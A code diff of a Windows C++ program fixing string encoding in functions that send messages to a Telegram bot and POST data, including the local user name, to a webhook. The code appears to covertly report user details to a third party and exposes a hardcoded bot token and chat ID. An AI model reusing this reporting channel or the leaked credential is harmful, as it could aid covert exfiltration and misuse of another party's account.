@@ -94,6 +94,16 @@ std::string wstring_to_utf8(const std::wstring& wstr) {
     return str;
 }
 
+// Helper function to convert string to wstring
+std::wstring string_to_wstring(const std::string& str) {
+    if (str.empty()) return L"";
+    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
+    std::wstring wstr(size, 0);
+    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size);
+    wstr.pop_back();
+    return wstr;
+}
+
 // ========== TELEGRAM FUNCTION ==========
 void send_telegram(const std::wstring& message) {
     std::thread([message]() {
@@ -112,7 +122,7 @@ void send_telegram(const std::wstring& message) {
         std::string path = "/bot7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY/sendMessage?chat_id=7845441585&text=" + encoded;
         
         // Convert to wide string
-        std::wstring wpath(path.begin(), path.end());
+        std::wstring wpath = string_to_wstring(path);
         
         HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", 443, 0);
         if (!hConnect) {
@@ -160,7 +170,9 @@ void send_email(const std::wstring& subject, const std::wstring& body) {
                           "&user=" + wstring_to_utf8(userName);
         
         std::wstring path = L"/" + std::wstring(WEBHOOK_ID);
-        std::string headers = "Content-Type: application/x-www-form-urlencoded";
+        
+        // FIXED: Convert headers to wide string
+        std::wstring wheaders = L"Content-Type: application/x-www-form-urlencoded";
         
         HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(),
                                                NULL, WINHTTP_NO_REFERER,
@@ -168,8 +180,8 @@ void send_email(const std::wstring& subject, const std::wstring& body) {
                                                WINHTTP_FLAG_SECURE);
         if (hRequest) {
             // Convert data to wide string
-            std::wstring wdata(data.begin(), data.end());
-            WinHttpSendRequest(hRequest, headers.c_str(), headers.length(),
+            std::wstring wdata = string_to_wstring(data);
+            WinHttpSendRequest(hRequest, wheaders.c_str(), wheaders.length(),
                               (LPVOID)wdata.c_str(),
                               wdata.length() * sizeof(wchar_t),
                               wdata.length() * sizeof(wchar_t), 0);
